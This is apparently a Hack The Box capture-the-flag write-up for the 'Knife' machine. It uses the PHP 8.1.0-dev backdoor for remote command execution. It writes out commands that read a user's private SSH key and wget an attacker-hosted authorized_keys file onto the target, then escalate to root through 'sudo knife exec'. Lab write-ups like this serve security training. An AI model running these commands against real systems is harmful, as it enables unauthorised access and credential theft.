**Knife is an easy machine from Hack The Box.**

### Enumeration

`nmap` as always.

`nmap -sC -sV knife.htb`

```

Pretty simple box, as expected. SSH and HTTP. I'll take a look at the web page first.

It's a pretty non-functional site. None of the buttons take me anywhere, and the page source doesn't reveal any particularly interesting information. I ran `gobuster` to try and enumerate subdirectories, but not much there either.

I open up Burpsuite and intercept my request for the homepage:

The response headers reveal that the site is running `PHP/8.1.0-dev`. Now that's something I can work with.

### Exploitation

A quick google search turns up an [unauthenticated RCE exploit](https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html).

To verify it works, I run `python3 php.py -u http://10.10.10.242/ -c whoami` as a proof of concept.

Looks like I do indeed have RCE. After a bit of (unsuccessful) fumbling around with various reverse shells and payloads, I start looking for a more persistent solution.

I can view `james` private SSH key by running `python3 php.py -u http://10.10.10.242/ -c "cat /home/james/.ssh/id_rsa"`:

I tried to crack it with `john` but no dice. Can I write to that directory?

I sure can! This means I should be able to copy my own public key into an `authorized_keys` file, and use my private key to SSH in.

I generate a keypair with `ssh-keygen`, place it in a file called `authorized_keys`, and host that on my own web server with `sudo python -m SimpleHTTPServer 80`.

Run a command to download the key file and place it in `/home/james/.ssh/`:

`python3 php.py -u http://10.10.10.242/ -c "wget http://10.10.14.16:8080/authorized_keys -P ~/.ssh/"`

After verifiying that the file was written to the SSH directory correctly, I can easily SSH in as `james`:

`ssh -i /home/kali/.ssh/id_rsa james@10.10.10.242`

![Pasted image 20210602171958](https://user-images.githubusercontent.com/60187707/131223458-887bf6c2-e3b9-47a4-9f66-2ae96f9b6296.png)

And I'm on as `james`.

### Privilege Escalation

Of course, I run `sudo -l` first, to see if `james` has any `sudo` permissions:

They are able to run `knife` as `root` without a password. After looking at the help page for the `knife` binary, I see that there is an `exec` subcommand, that I can use to make system calls. Seems easy enough.

`sudo knife exec -E 'system("su")'`

Just like that, Knife has been owned.
